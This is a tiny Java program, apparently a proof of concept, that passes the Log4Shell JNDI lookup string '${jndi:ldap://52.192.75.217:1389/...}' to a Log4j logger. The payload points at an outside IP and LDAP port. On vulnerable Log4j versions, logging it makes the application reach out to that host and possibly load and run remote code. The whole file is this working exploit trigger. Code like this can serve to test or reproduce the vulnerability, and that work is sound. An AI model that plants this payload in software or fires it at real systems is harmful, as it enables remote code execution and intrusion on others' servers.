import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        System.out.println();
        logger.error("${jndi:ldap://52.192.75.217:1389/qqsv77}");
    }
}
